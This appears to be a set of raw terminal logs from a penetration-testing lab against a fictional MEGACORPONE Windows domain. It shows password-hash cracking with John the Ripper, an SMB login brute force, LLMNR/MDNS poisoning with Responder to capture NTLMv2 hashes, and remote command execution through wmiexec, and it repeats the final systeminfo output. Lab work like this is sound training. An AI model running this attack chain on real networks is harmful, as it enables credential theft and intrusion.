```
From ZenMap scan result

windows DC01 - 172.22.117.10
windows10 - 172.22.117.20
172.22.117.100
172.22.117.150

```

```
root@ip-10-0-1-231:/home/sysadmin# john crack.txt 
Loaded 6 password hashes with 6 different salts (md5crypt [MD5 32/64 X2])
Press 'q' or Ctrl-C to abort, almost any other key for status
postgres         (postgres)
user             (user)
service          (service)
123456789        (klog)
cybersecurity    (msfadmin)
Password!        (tstark)
6g 0:00:00:07 100% 2/3 0.7832g/s 12758p/s 12764c/s 12764C/s Sss2..Password!
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

```
msf6 auxiliary(scanner/smb/smb_login) > exploit

[*] 172.22.117.20:445     - 172.22.117.20:445 - Starting SMB login bruteforce
[+] 172.22.117.20:445     - 172.22.117.20:445 - Success: 'megacorpone\tstark:Password!' Administrator
[!] 172.22.117.20:445     - No active DB -- Credential data will not be saved!
[*] 172.22.117.20:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_login) >
```


```
┌──(root💀kali)-[~]
└─# responder -I eth1 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.2.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]




[*] [MDNS] Poisoned answer sent to 172.22.117.20   for name fileshrae01.local
[*] [LLMNR]  Poisoned answer sent to 172.22.117.20 for name fileshrae01
[SMB] NTLMv2-SSP Client   : 172.22.117.20
[SMB] NTLMv2-SSP Username : MEGACORPONE\pparker
[SMB] NTLMv2-SSP Hash     : pparker::MEGACORPONE:4f0babcf1f58d485:8ECF796C3196DA3FEC43FDF81184C056:0101000000000000C0653150DE09D201EF7C98B3E1A60778000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000300000DAF3CDFA73C6BA81B18767D524E7B80626185A4D1ADF21D97457111F91A41EE50A001000000000000000000000000000000000000900200063006900660073002F00660069006C00650073006800720061006500300031000000000000000000
[*] [LLMNR]  Poisoned answer sent to 172.22.117.20 for name fileshrae01
[*] [MDNS] Poisoned answer sent to 172.22.117.20   for name fileshrae01.local
[SMB] NTLMv2-SSP Client   : 172.22.117.20
[SMB] NTLMv2-SSP Username : MEGACORPONE\pparker
[SMB] NTLMv2-SSP Hash     : pparker::MEGACORPONE:6328c972c6742daf:4DC39648F11A92B27FAB209135E81277:0101000000000000C0653150DE09D20160557FC99A6D5569000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000300000DAF3CDFA73C6BA81B18767D524E7B80626185A4D1ADF21D97457111F91A41EE50A001000000000000000000000000000000000000900200063006900660073002F00660069006C00650073006800720061006500300031000000000000000000
```


`crack with johntheripper`

```
┌──(root💀kali)-[~]
└─# cat winpass.txt
pparker::MEGACORPONE:6328c972c6742daf:4DC39648F11A92B27FAB209135E81277:0101000000000000C0653150DE09D20160557FC99A6D5569000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000300000DAF3CDFA73C6BA81B18767D524E7B80626185A4D1ADF21D97457111F91A41EE50A001000000000000000000000000000000000000900200063006900660073002F00660069006C00650073006800720061006500300031000000000000000000

┌──(root💀kali)-[~]
└─# john winpass.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Spring2021       (pparker)
1g 0:00:00:00 DONE 2/3 (2025-04-04 17:06) 11.11g/s 85133p/s 85133c/s 85133C/s 123456..iloveyou!
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

```
msf6 auxiliary(scanner/smb/impacket/wmiexec) > set COMMAND whoami
COMMAND => whoami
msf6 auxiliary(scanner/smb/impacket/wmiexec) > run

[*] Running for 172.22.117.20...
[*] 172.22.117.20 - SMBv3.0 dialect used
[*] megacorpone\pparker

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/impacket/wmiexec) > set COMMAND tasklist
COMMAND => tasklist
msf6 auxiliary(scanner/smb/impacket/wmiexec) > run

[*] Running for 172.22.117.20...
[*] 172.22.117.20 - SMBv3.0 dialect used
[*]
Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          8 K
System                           4 Services                   0         20 K
Registry                        72 Services                   0     20,260 K
smss.exe                       376 Services                   0        192 K
csrss.exe                      476 Services                   0      1,824 K
wininit.exe                    544 Services                   0        884 K
csrss.exe                      552 Console                    1      2,292 K
services.exe                   604 Services                   0      5,084 K
lsass.exe                      616 Services                   0     15,072 K
winlogon.exe                   644 Console                    1      5,896 K
svchost.exe                    760 Services                   0     20,044 K
fontdrvhost.exe                768 Console                    1      1,440 K
fontdrvhost.exe                776 Services                   0        164 K
svchost.exe                    860 Services                   0     12,944 K
dwm.exe                        948 Console                    1     43,556 K
svchost.exe                    464 Services                   0     48,548 K
svchost.exe                    540 Services                   0      8,764 K
svchost.exe                    728 Services                   0     15,112 K
svchost.exe                    756 Services                   0     11,932 K
svchost.exe                    828 Services                   0      3,292 K
svchost.exe                    980 Services                   0     17,644 K
svchost.exe                   1032 Services                   0     15,612 K
svchost.exe                   1116 Services                   0      7,696 K
svchost.exe                   1416 Services                   0      9,808 K
svchost.exe                   1496 Services                   0      3,940 K
svchost.exe                   1588 Services                   0      3,532 K
```

```
msf6 auxiliary(scanner/smb/impacket/wmiexec) > set COMMAND systeminfo
COMMAND => systeminfo
msf6 auxiliary(scanner/smb/impacket/wmiexec) > run

[*] Running for 172.22.117.20...
[*] 172.22.117.20 - SMBv3.0 dialect used
[*]
Host Name:                 WINDOWS10
OS Name:                   Microsoft Windows 10 Enterprise
OS Version:                10.0.19042 N/A Build 19042
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          sysadmin
Registered Organization:
Product ID:                00329-10292-56238-AA596
Original Install Date:     5/10/2021, 12:17:16 AM
System Boot Time:          4/4/2025, 4:40:38 PM
System Manufacturer:       Microsoft Corporation
System Model:              Virtual Machine
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 106 Stepping 6 GenuineIntel ~2793 Mhz
BIOS Version:              Microsoft Corporation Hyper-V UEFI Release v4.1, 5/13/2024
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     1,765 MB
Available Physical Memory: 583 MB
Virtual Memory: Max Size:  3,493 MB
Virtual Memory: Available: 1,994 MB
Virtual Memory: In Use:    1,499 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    megacorpone.local
Logon Server:              \\WINDC01
Hotfix(s):                 7 Hotfix(s) Installed.
                           [01]: KB5005539
                           [02]: KB4562830
                           [03]: KB4570334
                           [04]: KB4580325
                           [05]: KB4586864
                           [06]: KB5006670
                           [07]: KB5005699
Network Card(s):           1 NIC(s) Installed.
                           [01]: Microsoft Hyper-V Network Adapter
                                 Connection Name: Ethernet
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 172.22.117.20
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

```
msf6 auxiliary(scanner/smb/impacket/wmiexec) > set COMMAND systeminfo
COMMAND => systeminfo
msf6 auxiliary(scanner/smb/impacket/wmiexec) > run

[*] Running for 172.22.117.20...
[*] 172.22.117.20 - SMBv3.0 dialect used
[*]
Host Name:                 WINDOWS10
OS Name:                   Microsoft Windows 10 Enterprise
OS Version:                10.0.19042 N/A Build 19042
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          sysadmin
Registered Organization:
Product ID:                00329-10292-56238-AA596
Original Install Date:     5/10/2021, 12:17:16 AM
System Boot Time:          4/4/2025, 4:40:38 PM
System Manufacturer:       Microsoft Corporation
System Model:              Virtual Machine
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 106 Stepping 6 GenuineIntel ~2793 Mhz
BIOS Version:              Microsoft Corporation Hyper-V UEFI Release v4.1, 5/13/2024
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     1,765 MB
Available Physical Memory: 583 MB
Virtual Memory: Max Size:  3,493 MB
Virtual Memory: Available: 1,994 MB
Virtual Memory: In Use:    1,499 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    megacorpone.local
Logon Server:              \\WINDC01
Hotfix(s):                 7 Hotfix(s) Installed.
                           [01]: KB5005539
                           [02]: KB4562830
                           [03]: KB4570334
                           [04]: KB4580325
                           [05]: KB4586864
                           [06]: KB5006670
                           [07]: KB5005699
Network Card(s):           1 NIC(s) Installed.
                           [01]: Microsoft Hyper-V Network Adapter
                                 Connection Name: Ethernet
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 172.22.117.20
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```